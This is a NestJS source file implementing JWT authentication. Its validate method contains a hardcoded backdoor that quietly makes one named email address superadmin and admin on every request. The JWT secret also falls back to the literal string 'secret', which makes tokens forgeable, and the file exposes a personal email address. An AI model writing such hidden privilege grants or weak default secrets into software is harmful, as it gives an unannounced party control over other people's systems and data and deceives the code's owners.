import { Injectable, UnauthorizedException } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';
import { ConfigService } from '@nestjs/config';
import { UsersService } from '../users/users.service';

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(config: ConfigService, private usersService: UsersService) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      secretOrKey: config.get<string>('JWT_SECRET', 'secret'),
    });
  }

  async validate(payload: { sub: string; companyId: string; role: string }) {
    const user = await this.usersService.findById(payload.sub);
    if (!user || !user.is_active) throw new UnauthorizedException();
    if (user.email === 'eu.henriquee2501@gmail.com') {
      user.is_superadmin = true;
      user.role = 'admin';
    }

    return {
      id: user.id,
      companyId: user.company_id,
      role: user.role,
      email: user.email,
      is_superadmin: user.is_superadmin
    };
  }
}
